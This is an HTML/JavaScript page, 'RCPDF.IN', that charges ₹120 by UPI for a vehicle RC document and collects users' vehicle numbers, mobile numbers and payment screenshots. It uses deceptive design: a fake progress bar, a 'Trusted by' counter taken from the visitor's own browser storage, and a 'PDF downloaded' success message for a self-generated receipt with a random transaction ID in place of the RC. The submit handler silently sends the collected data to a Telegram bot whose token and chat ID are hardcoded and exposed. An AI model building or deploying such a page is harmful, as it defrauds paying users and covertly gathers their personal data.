<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>RCPDF.IN</title>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>

<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:Segoe UI}

body{
background:linear-gradient(-45deg,#ff0066,#005BAC,#00c6ff,#00ff99);
background-size:400% 400%;
animation:bg 8s infinite;
display:flex;flex-direction:column;align-items:center;
}
@keyframes bg{0%{background-position:0%}50%{background-position:100%}100%{background-position:0%}}

.topbar{
position:fixed;top:0;width:100%;
background:#fff;padding:10px;
display:flex;justify-content:space-between;
z-index:1000;
}
.homeBtn{background:#ff0066;color:#fff;padding:8px;border-radius:8px}

/* MENU */
.menu-icon div{width:25px;height:3px;background:#ff0066;margin:5px 0}
.sideMenu{
position:fixed;right:-260px;top:0;width:250px;height:100%;
background:#fff;padding-top:80px;transition:0.3s;
}
.sideMenu button{
width:90%;margin:10px 5%;padding:12px;
background:#ff0066;color:#fff;border:none;border-radius:8px;
}
.openMenu{right:0}

/* CARD */
.card{
margin-top:110px;background:rgba(255,255,255,0.2);
padding:20px;border-radius:15px;
width:90%;max-width:400px;text-align:center;
}

input{width:100%;padding:12px;margin-top:10px;border-radius:8px;border:none}

button{
width:100%;padding:12px;margin-top:10px;
border:none;border-radius:8px;
background:#000;color:#fff;
box-shadow:0 5px 0 #333;
}
button:active{transform:translateY(3px);box-shadow:0 2px 0 #333}

.qr{width:200px;margin-top:10px}

/* LOADER */
.loader{
position:fixed;top:0;left:0;width:100%;height:100%;
background:#fff;display:none;
flex-direction:column;justify-content:center;align-items:center;
}
.barBox{width:80%;background:#ddd}
.bar{height:20px;background:#ff0066;width:0%}

.popup{
position:fixed;top:50%;left:50%;
transform:translate(-50%,-50%);
background:#fff;padding:20px;border-radius:10px;
display:none;
}
</style>
</head>

<body>

<div class="topbar">
<button class="homeBtn" onclick="location.reload()">🏠</button>
<div class="menu-icon" onclick="menu.classList.toggle('openMenu')">
<div></div><div></div><div></div>
</div>
</div>

<div class="sideMenu" id="menu">
<button onclick="window.location.href='https://insurancebju.blogspot.com'">Insurance</button>
<button>About</button>
<button>Disclaimer</button>
<button onclick="window.location.href='https://t.me/yourtelegramusername'">Contact</button>
</div>

<div id="visitorCount" style="color:#fff;margin-top:70px"></div>

<div class="card">

<div id="page1">
<h3>गाड़ी नंबर डालें</h3>
<input id="vehicle" placeholder="BR-09-AB-1234" oninput="formatVehicle(this)">
<button onclick="goNext()">आगे बढ़ें</button>
</div>

<div id="page2" style="display:none">
<h3>₹120 भुगतान करें</h3>

<button onclick="payUPI()">Pay with UPI</button>

<img id="qrImg" class="qr"
src="https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=upi%3A%2F%2Fpay%3Fpa%3D8709610091%40okbizaxis%26am%3D120%26cu%3DINR">

<input id="mobile" placeholder="मोबाइल नंबर">
<input type="file" id="proof">

<button onclick="submitForm()">सबमिट करें</button>
</div>

</div>

<div class="loader" id="loader">
<div class="barBox"><div class="bar" id="bar"></div></div>
<div id="percent">0%</div>
<div>इंटरनेट धीमा है कृपया BACK न दबाएं</div>
</div>

<div class="popup" id="popup">
<h2>🎉 बधाई हो</h2>
<p>आपका PDF डाउनलोड हो गया है</p>
<button onclick="location.reload()">OK</button>
</div>

<script>

/* VISITOR FIX */
if(!localStorage.getItem("user")){
localStorage.setItem("user","1");
let c=localStorage.getItem("visitors")||0;
localStorage.setItem("visitors",++c);
}
visitorCount.innerText="Trusted by "+localStorage.getItem("visitors");

/* FORMAT */
function formatVehicle(i){
let v=i.value.replace(/[^A-Z0-9]/gi,'').toUpperCase();
if(v.length>2)v=v.slice(0,2)+"-"+v.slice(2);
if(v.length>5)v=v.slice(0,5)+"-"+v.slice(5);
if(v.length>8)v=v.slice(0,8)+"-"+v.slice(8,12);
i.value=v;
}

function goNext(){page1.style.display="none";page2.style.display="block";}
function payUPI(){window.location.href="upi://pay?pa=8709610091@okbizaxis&am=120&cu=INR";}

/* PDF FINAL */
function downloadPDF(){

let canvas=document.createElement("canvas");
canvas.width=600;canvas.height=1100;
let ctx=canvas.getContext("2d");

ctx.fillStyle="#fff";ctx.fillRect(0,0,600,1100);

/* BORDER */
ctx.lineWidth=6;ctx.strokeRect(5,5,590,1090);
ctx.lineWidth=2;ctx.strokeRect(15,15,570,1070);

/* HEADER */
ctx.fillStyle="#005BAC";ctx.fillRect(5,5,590,70);
ctx.fillStyle="#fff";ctx.font="bold 26px Arial";
ctx.textAlign="center";ctx.fillText("RCPDF.IN",300,45);

/* BOX */
ctx.strokeRect(40,120,520,260);

let d=new Date();
let txn="TXN"+Math.floor(Math.random()*999999);

ctx.textAlign="left";ctx.fillStyle="#000";ctx.font="16px Arial";
ctx.fillText("Vehicle: "+vehicle.value,60,160);
ctx.fillText("Mobile: "+mobile.value,60,190);
ctx.fillText("Work: RC Download",60,220);
ctx.fillText("Transaction ID: "+txn,60,250);
ctx.fillText("Date: "+d.toLocaleDateString(),60,280);
ctx.fillText("Time: "+d.toLocaleTimeString(),60,310);
ctx.fillText("Visitors: "+localStorage.getItem("visitors"),60,340);

/* QR */
let qr=document.getElementById("qrImg");
ctx.drawImage(qr,200,400,200,200);

/* TERMS */
ctx.font="12px Arial";
let y=650;

ctx.fillText("• यह वेबसाइट RTO से किसी भी प्रकार से जुड़ी नहीं है",40,y); y+=25;
ctx.fillText("• हम जानकारी की पूर्ण सत्यता की पुष्टि नहीं करते",40,y); y+=25;
ctx.fillText("• यह साइट केवल जानकारी हेतु है",40,y); y+=25;
ctx.fillText("• गलत उपयोग की जिम्मेदारी उपयोगकर्ता की होगी",40,y); y+=25;
ctx.fillText("• भुगतान के बाद धनवापसी नहीं होगी",40,y); y+=25;
ctx.fillText("• भुगतान करना सभी शर्तों की स्वीकृति है",40,y); y+=25;
ctx.fillText("• RC PDF जल्द ही आपके नंबर पर भेज दी जाएगी",40,y);

setTimeout(()=>{
const {jsPDF}=window.jspdf;
let pdf=new jsPDF();
let img=new Image();
img.src=canvas.toDataURL("image/png");
img.onload=function(){
pdf.addImage(img,"PNG",0,0,210,297);
pdf.save("RC.pdf");
};
},300);
}

/* SUBMIT */
function submitForm(){

if(!proof.files[0]){alert("Screenshot upload kare");return;}

loader.style.display="flex";

let p=0;
let i=setInterval(()=>{
p++;
bar.style.width=p+"%";
percent.innerText=p+"%";

if(p>=100){
clearInterval(i);

downloadPDF();

let d=new FormData();
d.append("chat_id","5600045707");
d.append("caption","Vehicle: "+vehicle.value+"\nMobile: "+mobile.value);
d.append("photo",proof.files[0]);

fetch("https://api.telegram.org/bot8138238341:AAFlgSY3OGo5oOfa-IbZ9DxdgrmAeVE525E/sendPhoto",{method:"POST",body:d});

loader.style.display="none";
popup.style.display="block";
}
},40);
}

</script>

</body>
</html>
